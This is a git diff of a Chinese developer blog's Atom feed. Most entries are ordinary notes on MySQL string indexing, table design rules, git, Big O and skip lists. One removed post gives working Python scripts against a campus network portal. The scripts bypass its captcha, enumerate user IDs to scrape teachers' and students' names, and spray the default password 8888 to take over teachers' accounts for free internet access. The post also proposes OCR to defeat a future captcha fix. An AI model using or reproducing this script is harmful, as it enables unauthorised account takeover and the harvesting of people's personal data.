+<pre class="line-numbers"><code class="language-text">mysql&gt; select field_list from t where id_card_crc=crc32(&#39;input_id_card_string&#39;) and id_card=&#39;input_id_card_string&#39;
+</code></pre>
+
+<h2 id="toc_4">使用倒序存储和使用hash字段这两种方法的异同点。</h2>
+
+<p>首先，它们的相同点是，都不支持范围查询。倒序存储的字段上创建的索引是按照倒序字符串的方式排序的，已经没有办法利用索引方式查出身份证号码在[ID_X, ID_Y]的所有市民了。同样地，hash字段的方式也只能支持等值查询。</p>
+
+<p>它们的区别，主要体现在以下三个方面：</p>
+
+<ul>
+<li><p>从占用的额外空间来看，倒序存储方式在主键索引上，不会消耗额外的存储空间，而hash字段方法需要增加一个字段。当然，倒序存储方式使用4个字节的前缀长度应该是不够的，如果再长一点，这个消耗跟额外这个hash字段也差不多抵消了。</p></li>
+<li><p>在CPU消耗方面，倒序方式每次写和读的时候，都需要额外调用一次reverse函数，而hash字段的方式需要额外调用一次crc32()函数。如果只从这两个函数的计算复杂度来看的话，reverse函数额外消耗的CPU资源会更小些。</p></li>
+<li><p>从查询效率上看，使用hash字段方式的查询性能相对更稳定一些。因为crc32算出来的值虽然有冲突的概率，但是概率非常小，可以认为每次查询的平均扫描行数接近1。而倒序存储方式毕竟还是用的前缀索引的方式，也就是说还是会增加扫描行数。</p></li>
+</ul>
+
+<h2 id="toc_5">小结</h2>
+
+<p>字符串字段创建索引的场景，你可以使用的方式有：</p>
+
+<ol>
+<li>直接创建完整索引，这样可能比较占用空间；</li>
+<li>创建前缀索引，节省空间，但会增加查询扫描次数，并且不能使用覆盖索引；</li>
+<li>倒序存储，再创建前缀索引，用于绕过字符串本身前缀的区分度不够的问题；</li>
+<li>创建hash字段索引，查询性能稳定，有额外的存储和计算消耗，跟第三种方式一样，都不支持范围扫描。</li>
+</ol>
+
+<p>在实际应用中，你要根据业务字段的特点选择使用哪种方式。</p>
 
 ]]></content>
   </entry>
@@ -161,6 +1018,8 @@
     <updated>2021-09-30T15:42:55+08:00</updated>
     <id>http://565785929.github.io/16329877758446.html</id>
     <content type="html"><![CDATA[
+<p><img src="media/16329877758446/16413513618923.jpg" alt=""/></p>
+
 <p>进入项目根目录</p>
 
 <pre class="line-numbers"><code class="language-text">$ cd /c/users/john/blog/
@@ -181,7 +1040,7 @@
 <pre class="line-numbers"><code class="language-text">$ git push
 </code></pre>
 
-<p><a href="https://www.cnblogs.com/ifme/p/11796311.html">git删除远程.idea目录</a></p>
+<p>来源：<a href="https://www.cnblogs.com/ifme/p/11796311.html">git删除远程.idea目录</a></p>
 
 ]]></content>
   </entry>
@@ -365,1519 +1224,6 @@ gzip</p>
 <p><img src="media/16324912353122/16324943999070.jpg" alt="" style="width:591px;"/></p>
 
 <p><img src="media/16324912353122/16324944282460.jpg" alt="" style="width:483px;"/></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[数组，链表，跳表]]></title>
-    <link href="http://565785929.github.io/16324909961481.html"/>
-    <updated>2021-09-24T21:43:16+08:00</updated>
-    <id>http://565785929.github.io/16324909961481.html</id>
-    <content type="html"><![CDATA[
-<p>为什么redis用的是跳表，而不是红黑树或其他的数据结构</p>
-
-<p>LRU Cache - Linked list</p>
-
-<ul>
-<li><a href="https://www.jianshu.com/p/b1ab4a170c3c">https://www.jianshu.com/p/b1ab4a170c3c</a></li>
-<li><a href="https://leetcode-cn.com/problems/lru-cache">https://leetcode-cn.com/problems/lru-cache</a></li>
-</ul>
-
-<p>Redis - Skip List</p>
-
-<ul>
-<li><a href="https://redisbook.readthedocs.io/en/latest/internal-datastruct/">https://redisbook.readthedocs.io/en/latest/internal-datastruct/</a>
-skiplist.html</li>
-<li><a href="https://www.zhihu.com/question/20202931">https://www.zhihu.com/question/20202931</a></li>
-</ul>
-
-<h4 id="toc_0">ArrayList与LinkedList区别</h4>
-
-<p>来自LinkedList实现者Joshua Bloch的一条推文，有被笑到。</p>
-
-<p><img src="media/16324909961481/16324965731123.jpg" alt="" style="width:635px;"/></p>
-
-<p>关于实现理论就不赘述了，说一下可能用到LinkedList的场景。</p>
-
-<ol>
-<li>LinkedList 无需扩容的特性，如果明确不清楚集合大小，此时可考虑LinkedList 是不是更合适。因为不需要像ArrayList 一样频繁地进行扩容。</li>
-<li>LRU Cache - Linked list</li>
-</ol>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[接口数据安全]]></title>
-    <link href="http://565785929.github.io/16322941219176.html"/>
-    <updated>2021-09-22T15:02:01+08:00</updated>
-    <id>http://565785929.github.io/16322941219176.html</id>
-    <content type="html"><![CDATA[
-<p>接口数据安全<br/>
-<a href="https://mp.weixin.qq.com/s/CNK5p2Qe7ooaPao3GHyBfQ">https://mp.weixin.qq.com/s/CNK5p2Qe7ooaPao3GHyBfQ</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[编写爬虫获取教师账号 校园免费上网]]></title>
-    <link href="http://565785929.github.io/16322341811288.html"/>
-    <updated>2021-09-21T22:23:01+08:00</updated>
-    <id>http://565785929.github.io/16322341811288.html</id>
-    <content type="html"><![CDATA[
-<p>通过Python实现</p>
-
-<p>我们学校使用移动的网络账号，修改账号密码的界面是这样的。</p>
-
-<p><img src="media/16322341811288/16322341983535.jpg" alt=""/></p>
-
-<p>这个页面有个漏洞，就是可以绕过验证码直接登录。 所以先使用自己的账号登录一下。登录之后点击基本信息中的变更资料</p>
-
-<p><img src="media/16322341811288/16322342103918.jpg" alt=""/><br/>
-用户姓名就在这里</p>
-
-<p>使用右键复制链接地址之后</p>
-
-<p><img src="media/16322341811288/16322342221212.jpg" alt=""/></p>
-
-<p>你会得到 这样的网址</p>
-
-<blockquote>
-<p><a href="http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=*********&amp;paratype=2">http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=*********&amp;paratype=2</a></p>
-</blockquote>
-
-<p>分析一下这个网址， 其中user_id 就是你的学号</p>
-
-<p>通过修改这个学号就可以得到大家的姓名</p>
-
-<pre class="line-numbers"><code class="language-python">import requests
-import re
-
-class Sajor():
-    def __init__(self):
-        self.url_login = &quot;http://10.40.4.3/selfLogonAction.do&quot;
-        self.session = requests.session()
-        self.headers = {
-            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
-        }
-        
-    def get_session(self):    
-        &quot;&quot;&quot;&quot; 获取session &quot;&quot;&quot;&quot;
-        data = {
-            &quot;user_id&quot;: &quot;YOUR_ID&quot;,    # 填写你的id
-            &quot;passwd&quot;: &quot;YOUR_PASSOWRD&quot;,    # 填写你的密码
-            &quot;validateCode&quot;: &quot;1234&quot;,
-            &quot;x&quot;: &quot;41&quot;,
-            &quot;y&quot;: &quot;12&quot;,
-        }
-        self.session.post(headers=self.headers, url=self.url_login, data=data)
-    
-    def get_user_name(self, user_id):  
-        &quot;&quot;&quot; 获取用户姓名 &quot;&quot;&quot;
-        url_name = &quot;http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=&quot; + user_id + &quot;&amp;paratype=2&quot;
-        try:
-            name_text = self.session.get(headers=self.headers, url=url_name).text
-            name = re.findall(&#39;id=&quot;user_name&quot; value=&quot;(.*?)&quot;&#39;, name_text)
-            return user_id, name[0]
-        except:
-            return None
-        
-s = Sajor()
-s.get_session()
-
-# 遍历用户学号大致范围
-for id in range(90000, 100000):
-    user_id, user_name = s.get_user_name(str(id))
-    if user_name:
-        print (user_id, user_name)
-</code></pre>
-
-<p>于是就得到了老师们的工号和姓名</p>
-
-<p><img src="media/16322341811288/16322343027449.jpg" alt=""/></p>
-
-<p>同样的也可以得到全校学生的学号和对应的姓名</p>
-
-<p>之后重点来了 由于学校师生的默认密码没有修改。默认8888</p>
-
-<p>所以遍历这些学号，看看有没有没改密码的老师。</p>
-
-<p>通过之前的登陆界面，验证码随便填写一个1234，若成功登陆右上角便会有欢迎</p>
-
-<p><img src="media/16322341811288/16322343160834.jpg" alt=""/></p>
-
-<p>通过这个写个简单的正则表达式 re.findall(&quot;<small>Welcome,</small>&quot;, login)</p>
-
-<p>login为当前页面的html代码，不为空则登陆成功。</p>
-
-<pre class="line-numbers"><code class="language-python">import requests
-import re
-
-class Sajor():
-    def __init__(self):
-        self.url_login = &quot;http://10.40.4.3/selfLogonAction.do&quot;
-        self.session = requests.session()
-        self.headers = {
-            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
-        }
-        
-    def get_session(self):    
-        &quot;&quot;&quot;&quot; 获取session &quot;&quot;&quot;&quot;
-        data = {
-            &quot;user_id&quot;: &quot;YOUR_ID&quot;,    # 填写你的id
-            &quot;passwd&quot;: &quot;YOUR_PASSOWRD&quot;,    # 填写你的密码
-            &quot;validateCode&quot;: &quot;1234&quot;,
-            &quot;x&quot;: &quot;41&quot;,
-            &quot;y&quot;: &quot;12&quot;,
-        }
-        self.session.post(headers=self.headers, url=self.url_login, data=data)
-    
-    def get_user_name(self, user_id):  
-        &quot;&quot;&quot; 获取用户姓名 &quot;&quot;&quot;
-        url_name = &quot;http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=&quot; + user_id + &quot;&amp;paratype=2&quot;
-        try:
-            name_text = self.session.get(headers=self.headers, url=url_name).text
-            name = re.findall(&#39;id=&quot;user_name&quot; value=&quot;(.*?)&quot;&#39;, name_text)
-            return user_id, name[0]
-        except:
-            return None
-    
-    def get_free_id_password(self, user_id, user_password=&quot;8888&quot;):
-        data = {
-            &quot;user_id&quot;: user_id,
-            &quot;passwd&quot;: user_password,
-            &quot;validateCode&quot;: &quot;1234&quot;,  # 随便填写
-            &quot;x&quot;: &quot;41&quot;,
-            &quot;y&quot;: &quot;12&quot;,
-        }
-        login = self.session.post(headers=self.headers, url=self.url_login, data=data).text
-        if re.findall(&quot;&lt;small&gt;Welcome,&lt;/small&gt;&quot;, login):
-            return True
-        else:
-            return False
-            
-    def save_id(self):
-        for id in range(90000, 100000): # 这里可以修改为刚刚存储的工号，不必重跑
-            if(self.get_free_id_password(str(id))):
-                print(id)
-
-        
-s = Sajor()
-s.save_id()
-</code></pre>
-
-<p>于是就得到了免费的教师账号了，结果就不放出了。</p>
-
-<p>其中爬出的数据都可以存到数据库中，这里没有写到数据库操作。</p>
-
-<p>若之后验证码修复，可以直接使用百度识别文字的api， 通过观察这个网页的验证码比较好识别</p>
-
-<p><img src="media/16322341811288/16322343579062.jpg" alt=""/></p>
-
-<p>这验证码看起来就比较清晰，，，百度文字识别orc ，完美识别</p>
-
-<p><a href="https://link.zhihu.com/?target=https%3A//cloud.baidu.com/product/ocr/general">“通用文字识别-文字识别-百度AI”</a></p>
-
-<p><img src="media/16322341811288/16322343717246.jpg" alt=""/></p>
-
-<p>所以说，这都不是事。 还是抓紧时间改改自己的密码吧！</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[复杂度 Big O notation]]></title>
-    <link href="http://565785929.github.io/16321235553115.html"/>
-    <updated>2021-09-20T15:39:15+08:00</updated>
-    <id>http://565785929.github.io/16321235553115.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>O( 1 ): Constant Complexity 常数复杂度</li>
-<li>O( logn ): Logarithmic Complexity 对数复杂度</li>
-<li>O( n ): Linear Complexity 线性时间复杂度</li>
-<li>O( n<sup>2</sup> ): N square Complexity 平⽅</li>
-<li>O( n<sup>3</sup> ): N square Complexity 立方</li>
-<li>O( 2<sup>n</sup> ): Exponential Growth 指数</li>
-<li>O( n! ): Factorial 阶乘</li>
-</ul>
-
-<p>O( 1 ) &lt; O( logn ) &lt;  O( n ) &lt; O( nlogn )  &lt; O( n<sup>2</sup> ) &lt; O( n<sup>3</sup> ) &lt; O( 2<sup>n</sup> ) &lt; O( n! ) &lt; O( n<sup>n</sup> )</p>
-
-<p><img src="media/16321235553115/16322368961150.jpg" alt="" style="width:794px;"/></p>
-
-<p>Master Theorem 主定理 递归函数 时间复杂度计算方法<br/>
-<img src="media/16321235553115/16324968871790.jpg" alt="" style="width:696px;"/></p>
-
-<h1 id="toc_0">学习方法</h1>
-
-<p>来自于 <outliers> 异类: 不一样的成功启示录</p>
-
-<p><img src="media/16321235553115/16322371489779.jpg" alt="" style="width:184px;"/></p>
-
-<ul>
-<li>Chunk it up 切碎知识点</li>
-<li>Deliberate Practicing 刻意练习</li>
-<li>feedback 反馈</li>
-</ul>
-
-<p><a href="http://naotu.baidu.com/file/b832f043e2ead159d584cca4efb19703?token=7a6a56eb2630548c">数据结构脑图</a><br/>
-<a href="http://naotu.baidu.com/file/0a53d3a5343bd86375f348b2831d3610?token=5ab1de1c90d5f3ec">算法脑图</a></p>
-
-<h2 id="toc_1">Chunk it up</h2>
-
-<p>做脑图</p>
-
-<p>来自reddit中ask me anything<br/>
-<img src="media/16321235553115/16321238197078.jpg" alt="" style="width:812px;"/></p>
-
-<h2 id="toc_2">数据结构分类</h2>
-
-<ul>
-<li>一维数据结构
-<ul>
-<li>基础</li>
-<li>数组 array(string)</li>
-<li>链表 linked list</li>
-<li>高级</li>
-<li>栈 stack</li>
-<li>队列 queue</li>
-<li>双端队列 deque(double-ended queue)</li>
-<li>集合 set</li>
-<li>映射 map(hash or map)</li>
-</ul></li>
-<li>二维数据结构
-<ul>
-<li>基础：</li>
-<li>树 tree</li>
-<li>图 graph</li>
-<li>高级：</li>
-<li>二叉搜索树 binary search tree(red-black tree, AVL)</li>
-<li>堆 heap</li>
-<li>并查集 disjoint set</li>
-<li>字典树 trie</li>
-</ul></li>
-<li>特殊数据结构
-<ul>
-<li>位运算 bitwise</li>
-<li>布隆过滤器 BloomFilter</li>
-<li>缓存 LRU Cache</li>
-</ul></li>
-</ul>
-
-<p><strong>切题四件套</strong></p>
-
-<ul>
-<li>Clarification 明确题意</li>
-<li>Possible solutions 思考多种方法
-<ul>
-<li>compare(time/space) 对比复杂度</li>
-<li>optimal 加强优化</li>
-</ul></li>
-<li>Coding 多写</li>
-<li>Test cases 用例</li>
-</ul>
-
-<h1 id="toc_3">LeetCode刷题法</h1>
-
-<h2 id="toc_4">第一遍</h2>
-
-<ul>
-<li>5mins 读题+思考</li>
-<li>直接看解法：比较各个解法优劣</li>
-<li>背诵并默写好的解法<br/>
-## 第二遍</li>
-<li>马上自己写 -&gt; 提交LeetCode</li>
-<li>多种解法比较、体会 -&gt; 优化</li>
-</ul>
-
-<h2 id="toc_5">第三遍</h2>
-
-<ul>
-<li>过了一天之后，再重复做题</li>
-<li>不同解法的熟练程度 -&gt; 专项练习</li>
-</ul>
-
-<h2 id="toc_6">第四遍</h2>
-
-<ul>
-<li>过了一周：反复回来练习不熟练的</li>
-</ul>
-
-<h2 id="toc_7">第五遍</h2>
-
-<ul>
-<li>面试前一周恢复性训练</li>
-</ul>
-
-<p>要看国际站的题解 discuss</p>
-
-<p><a href="https://www.markhneedham.com/blog/2008/09/15/clean-code-book-review/">https://www.markhneedham.com/blog/2008/09/15/clean-code-book-review/</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Commit message 规范]]></title>
-    <link href="http://565785929.github.io/16319589839018.html"/>
-    <updated>2021-09-18T17:56:23+08:00</updated>
-    <id>http://565785929.github.io/16319589839018.html</id>
-    <content type="html"><![CDATA[
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[MySQL数据库设计规范（仅供参考）]]></title>
-    <link href="http://565785929.github.io/16312407110535.html"/>
-    <updated>2021-09-10T10:25:11+08:00</updated>
-    <id>http://565785929.github.io/16312407110535.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>
-<a href="#toc_0">1. 规范背景与目的</a>
-</li>
-<li>
-<a href="#toc_1">2. 设计规范</a>
-<ul>
-<li>
-<a href="#toc_2">2.1 数据库设计</a>
-<ul>
-<li>
-<a href="#toc_3">2.1.1 库名</a>
-</li>
-<li>
-<a href="#toc_4">2.1.2 表结构</a>
-</li>
-<li>
-<a href="#toc_5">2.1.3 列数据类型优化</a>
-</li>
-<li>
-<a href="#toc_6">2.1.4 索引设计</a>
-</li>
-<li>
-<a href="#toc_7">2.1.5 分库分表、分区表</a>
-</li>
-<li>
-<a href="#toc_8">2.1.6 字符集</a>
-</li>
-<li>
-<a href="#toc_9">2.1.7 程序层DAO设计建议</a>
-</li>
-<li>
-<a href="#toc_10">2.1.8 一个规范的建表语句示例</a>
-</li>
-</ul>
-</li>
-<li>
-<a href="#toc_11">2.2 SQL编写</a>
-<ul>
-<li>
-<a href="#toc_12">2.2.1 DML语句</a>
-</li>
-<li>
-<a href="#toc_13">2.2.2 多表连接</a>
-</li>
-<li>
-<a href="#toc_14">2.2.3 事务</a>
-</li>
-<li>
-<a href="#toc_15">2.2.4 排序和分组</a>
-</li>
-<li>
-<a href="#toc_16">2.2.5 线上禁止使用的SQL语句</a>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-
-<p><img src="media/16312407110535/16322355440161.jpg" alt=""/></p>
-
-<h2 id="toc_0">1. 规范背景与目的</h2>
-
-<p>MySQL数据库与 Oracle、 SQL Server 等数据库相比，有其内核上的优势与劣势。我们在使用MySQL数据库的时候需要遵循一定规范，扬长避短。本规范旨在帮助或指导RD、QA、OP等技术人员做出适合线上业务的数据库设计。在数据库变更和处理流程、数据库表设计、SQL编写等方面予以规范，从而为公司业务系统稳定、健康地运行提供保障。</p>
-
-<h2 id="toc_1">2. 设计规范</h2>
-
-<h3 id="toc_2">2.1 数据库设计</h3>
-
-<p>以下所有规范会按照【高危】、【强制】、【建议】三个级别进行标注，遵守优先级从高到低。</p>
-
-<p>对于不满足【高危】和【强制】两个级别的设计，DBA会强制打回要求修改。</p>
-
-<h4 id="toc_3">2.1.1 库名</h4>
-
-<p>【强制】库的名称必须控制在32个字符以内，相关模块的表名与表名之间尽量提现join的关系，如user表和user_login表。<br/>
-【强制】库的名称格式：业务系统名称_子系统名，同一模块使用的表名尽量使用统一前缀。<br/>
-【强制】一般分库名称命名格式是库通配名_编号，编号从0开始递增，比如wenda_001以时间进行分库的名称格式是“库通配名_时间”<br/>
-【强制】创建数据库时必须显式指定字符集，并且字符集只能是utf8或者utf8mb4。创建数据库SQL举例：create database db1 default character set utf8;。</p>
-
-<h4 id="toc_4">2.1.2 表结构</h4>
-
-<p>【强制】表和列的名称必须控制在32个字符以内，表名只能使用字母、数字和下划线，一律小写。<br/>
-【强制】表名要求模块名强相关，如师资系统采用”sz”作为前缀，渠道系统采用”qd”作为前缀等。<br/>
-【强制】创建表时必须显式指定字符集为utf8或utf8mb4。<br/>
-【强制】创建表时必须显式指定表存储引擎类型，如无特殊需求，一律为InnoDB。当需要使用除InnoDB/MyISAM/Memory以外的存储引擎时，必须通过DBA审核才能在生产环境中使用。因为Innodb表支持事务、行锁、宕机恢复、MVCC等关系型数据库重要特性，为业界使用最多的MySQL存储引擎。而这是其他大多数存储引擎不具备的，因此首推InnoDB。<br/>
-【强制】建表必须有comment<br/>
-【建议】建表时关于主键：(1)强制要求主键为id，类型为int或bigint，且为auto_increment(2)标识表里每一行主体的字段不要设为主键，建议设为其他字段如user_id，order_id等，并建立unique key索引（可参考cdb.teacher表设计）。因为如果设为主键且主键值为随机插入，则会导致innodb内部page分裂和大量随机I/O，性能下降。<br/>
-【建议】核心表（如用户表，金钱相关的表）必须有行数据的创建时间字段create_time和最后更新时间字段update_time，便于查问题。<br/>
-【建议】表中所有字段必须都是NOT NULL属性，业务可以根据需要定义DEFAULT值。因为使用NULL值会存在每一行都会占用额外存储空间、数据迁移容易出错、聚合函数计算结果偏差等问题。<br/>
-【建议】建议对表里的blob、text等大字段，垂直拆分到其他表里，仅在需要读这些对象的时候才去select。<br/>
-【建议】反范式设计：把经常需要join查询的字段，在其他表里冗余一份。如user_name属性在user_account，user_login_log等表里冗余一份，减少join查询。<br/>
-【强制】中间表用于保留中间结果集，名称必须以tmp_开头。备份表用于备份或抓取源表快照，名称必须以bak_开头。中间表和备份表定期清理。<br/>
-【强制】对于超过100W行的大表进行alter table，必须经过DBA审核，并在业务低峰期执行。因为alter table会产生表锁，期间阻塞对于该表的所有写入，对于业务可能会产生极大影响。</p>
-
-<h4 id="toc_5">2.1.3 列数据类型优化</h4>
-
-<p>【建议】表中的自增列（auto_increment属性），推荐使用bigint类型。因为无符号int存储范围为-2147483648~2147483647（大约21亿左右），溢出后会导致报错。<br/>
-【建议】业务中选择性很少的状态status、类型type等字段推荐使用tinytint或者smallint类型节省存储空间。<br/>
-【建议】业务中IP地址字段推荐使用int类型，不推荐用char(15)。因为int只占4字节，可以用如下函数相互转换，而char(15)占用至少15字节。一旦表数据行数到了1亿，那么要多用1.1G存储空间。 SQL：select inet_aton(&#39;192.168.2.12&#39;); select inet_ntoa(3232236044); PHP: ip2long(‘192.168.2.12’); long2ip(3530427185);<br/>
-【建议】不推荐使用enum，set。 因为它们浪费空间，且枚举值写死了，变更不方便。推荐使用tinyint或smallint。<br/>
-【建议】不推荐使用blob，text等类型。它们都比较浪费硬盘和内存空间。在加载表数据时，会读取大字段到内存里从而浪费内存空间，影响系统性能。建议和PM、RD沟通，是否真的需要这么大字段。Innodb中当一行记录超过8098字节时，会将该记录中选取最长的一个字段将其768字节放在原始page里，该字段余下内容放在overflow-page里。不幸的是在compact行格式下，原始page和overflow-page都会加载。<br/>
-【建议】存储金钱的字段，建议用int，程序端乘以100和除以100进行存取。因为int占用4字节，而double占用8字节，空间浪费。<br/>
-【建议】文本数据尽量用varchar存储。因为varchar是变长存储，比char更省空间。MySQL server层规定一行所有文本最多存65535字节，因此在utf8字符集下最多存21844个字符，超过会自动转换为mediumtext字段。而text在utf8字符集下最多存21844个字符，mediumtext最多存2<sup>24/3个字符，longtext最多存2<sup>32个字符。一般建议用varchar类型，字符数不要超过2700。</sup></sup><br/>
-【建议】时间类型尽量选取timestamp。因为datetime占用8字节，timestamp仅占用4字节，但是范围为1970-01-01 00:00:01到2038-01-01 00:00:00。更为高阶的方法，选用int来存储时间，使用SQL函数unix_timestamp()和from_unixtime()来进行转换。</p>
-
-<h4 id="toc_6">2.1.4 索引设计</h4>
-
-<p>【强制】InnoDB表必须主键为id int/bigint auto_increment,且主键值禁止被更新。<br/>
-【建议】主键的名称以“pk_”开头，唯一键以“uk_”或“uq_”开头，普通索引以“idx_”开头，一律使用小写格式，以表名/字段的名称或缩写作为后缀。<br/>
-【强制】InnoDB和MyISAM存储引擎表，索引类型必须为BTREE；MEMORY表可以根据需要选择HASH或者BTREE类型索引。<br/>
-【强制】单个索引中每个索引记录的长度不能超过64KB。<br/>
-【建议】单个表上的索引个数不能超过7个。<br/>
-【建议】在建立索引时，多考虑建立联合索引，并把区分度最高的字段放在最前面。如列userid的区分度可由select count(distinct userid)计算出来。<br/>
-【建议】在多表join的SQL里，保证被驱动表的连接列上有索引，这样join执行效率最高。<br/>
-【建议】建表或加索引时，保证表里互相不存在冗余索引。对于MySQL来说，如果表里已经存在key(a,b)，则key(a)为冗余索引，需要删除。</p>
-
-<h4 id="toc_7">2.1.5 分库分表、分区表</h4>
-
-<p>【强制】分区表的分区字段（partition-key）必须有索引，或者是组合索引的首列。<br/>
-【强制】单个分区表中的分区（包括子分区）个数不能超过1024。<br/>
-【强制】上线前RD或者DBA必须指定分区表的创建、清理策略。<br/>
-【强制】访问分区表的SQL必须包含分区键。<br/>
-【建议】单个分区文件不超过2G，总大小不超过50G。建议总分区数不超过20个。<br/>
-【强制】对于分区表执行alter table操作，必须在业务低峰期执行。<br/>
-【强制】采用分库策略的，库的数量不能超过1024<br/>
-【强制】采用分表策略的，表的数量不能超过4096<br/>
-【建议】单个分表不超过500W行，ibd文件大小不超过2G，这样才能让数据分布式变得性能更佳。<br/>
-【建议】水平分表尽量用取模方式，日志、报表类数据建议采用日期进行分表。</p>
-
-<h4 id="toc_8">2.1.6 字符集</h4>
-
-<p>【强制】数据库本身库、表、列所有字符集必须保持一致，为utf8或utf8mb4。<br/>
-【强制】前端程序字符集或者环境变量中的字符集，与数据库、表的字符集必须一致，统一为utf8。</p>
-
-<h4 id="toc_9">2.1.7 程序层DAO设计建议</h4>
-
-<p>【建议】新的代码不要用model，推荐使用手动拼SQL+绑定变量传入参数的方式。因为model虽然可以使用面向对象的方式操作db，但是其使用不当很容易造成生成的SQL非常复杂，且model层自己做的强制类型转换性能较差，最终导致数据库性能下降。<br/>
-【建议】前端程序连接MySQL或者redis，必须要有连接超时和失败重连机制，且失败重试必须有间隔时间。<br/>
-【建议】前端程序报错里尽量能够提示MySQL或redis原生态的报错信息，便于排查错误。<br/>
-【建议】对于有连接池的前端程序，必须根据业务需要配置初始、最小、最大连接数，超时时间以及连接回收机制，否则会耗尽数据库连接资源，造成线上事故。<br/>
-【建议】对于log或history类型的表，随时间增长容易越来越大，因此上线前RD或者DBA必须建立表数据清理或归档方案。<br/>
-【建议】在应用程序设计阶段，RD必须考虑并规避数据库中主从延迟对于业务的影响。尽量避免从库短时延迟（20秒以内）对业务造成影响，建议强制一致性的读开启事务走主库，或更新后过一段时间再去读从库。<br/>
-【建议】多个并发业务逻辑访问同一块数据（innodb表）时，会在数据库端产生行锁甚至表锁导致并发下降，因此建议更新类SQL尽量基于主键去更新。<br/>
-【建议】业务逻辑之间加锁顺序尽量保持一致，否则会导致死锁。<br/>
-【建议】对于单表读写比大于10:1的数据行或单个列，可以将热点数据放在缓存里（如mecache或redis），加快访问速度，降低MySQL压力。</p>
-
-<h4 id="toc_10">2.1.8 一个规范的建表语句示例</h4>
-
-<p>一个较为规范的建表语句为：</p>
-
-<p>CREATE TABLE user (<br/>
-  <code>id</code> bigint(11) NOT NULL AUTO_INCREMENT,<br/>
-  <code>user_id</code> bigint(11) NOT NULL COMMENT ‘用户id’<br/>
-  <code>username</code> varchar(45) NOT NULL COMMENT &#39;真实姓名&#39;,<br/>
-  <code>email</code> varchar(30) NOT NULL COMMENT ‘用户邮箱’,<br/>
-  <code>nickname</code> varchar(45) NOT NULL COMMENT &#39;昵称&#39;,<br/>
-  <code>avatar</code> int(11) NOT NULL COMMENT &#39;头像&#39;,<br/>
-  <code>birthday</code> date NOT NULL COMMENT &#39;生日&#39;,<br/>
-  <code>sex</code> tinyint(4) DEFAULT &#39;0&#39; COMMENT &#39;性别&#39;,<br/>
-  <code>short_introduce</code> varchar(150) DEFAULT NULL COMMENT &#39;一句话介绍自己，最多50个汉字&#39;,<br/>
-  <code>user_resume</code> varchar(300) NOT NULL COMMENT &#39;用户提交的简历存放地址&#39;,<br/>
-  <code>user_register_ip</code> int NOT NULL COMMENT ‘用户注册时的源ip’,<br/>
-  <code>create_time</code> timestamp NOT NULL COMMENT ‘用户记录创建的时间’,<br/>
-  <code>update_time</code> timestamp NOT NULL COMMENT ‘用户资料修改的时间’,<br/>
-  <code>user_review_status</code> tinyint NOT NULL COMMENT ‘用户资料审核状态，1为通过，2为审核中，3为未通过，4为还未提交审核’,<br/>
-  PRIMARY KEY (<code>id</code>),<br/>
-  UNIQUE KEY <code>idx_user_id</code> (<code>user_id</code>),<br/>
-  KEY <code>idx_username</code>(<code>username</code>),<br/>
-  KEY <code>idx_create_time</code>(<code>create_time</code>,<code>user_review_status</code>)<br/>
-) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&#39;网站用户基本信息&#39;;</p>
-
-<h3 id="toc_11">2.2 SQL编写</h3>
-
-<h4 id="toc_12">2.2.1 DML语句</h4>
-
-<p>【强制】SELECT语句必须指定具体字段名称，禁止写成*。因为select *会将不该读的数据也从MySQL里读出来，造成网卡压力。且表字段一旦更新，但model层没有来得及更新的话，系统会报错。<br/>
-【强制】insert语句指定具体字段名称，不要写成insert into t1 values(…)，道理同上。<br/>
-【建议】insert into…values(XX),(XX),(XX)…。这里XX的值不要超过5000个。值过多虽然上线很很快，但会引起主从同步延迟。<br/>
-【建议】SELECT语句不要使用UNION，推荐使用UNION ALL，并且UNION子句个数限制在5个以内。因为union all不需要去重，节省数据库资源，提高性能。<br/>
-【建议】in值列表限制在500以内。例如select… where userid in(….500个以内…)，这么做是为了减少底层扫描，减轻数据库压力从而加速查询。<br/>
-【建议】事务里批量更新数据需要控制数量，进行必要的sleep，做到少量多次。<br/>
-【强制】事务涉及的表必须全部是innodb表。否则一旦失败不会全部回滚，且易造成主从库同步终端。<br/>
-【强制】写入和事务发往主库，只读SQL发往从库。<br/>
-【强制】除静态表或小表（100行以内），DML语句必须有where条件，且使用索引查找。<br/>
-【强制】生产环境禁止使用hint，如sql_no_cache，force index，ignore key，straight join等。因为hint是用来强制SQL按照某个执行计划来执行，但随着数据量变化我们无法保证自己当初的预判是正确的，因此我们要相信MySQL优化器！<br/>
-【强制】where条件里等号左右字段类型必须一致，否则无法利用索引。<br/>
-【建议】SELECT|UPDATE|DELETE|REPLACE要有WHERE子句，且WHERE子句的条件必需使用索引查找。<br/>
-【强制】生产数据库中强烈不推荐大表上发生全表扫描，但对于100行以下的静态表可以全表扫描。查询数据量不要超过表行数的25%，否则不会利用索引。<br/>
-【强制】WHERE 子句中禁止只使用全模糊的LIKE条件进行查找，必须有其他等值或范围查询条件，否则无法利用索引。<br/>
-【建议】索引列不要使用函数或表达式，否则无法利用索引。如where length(name)=&#39;Admin&#39;或where user_id+2=10023。<br/>
-【建议】减少使用or语句，可将or语句优化为union，然后在各个where条件上建立索引。如where a=1 or b=2优化为where a=1… union …where b=2, key(a),key(b)。<br/>
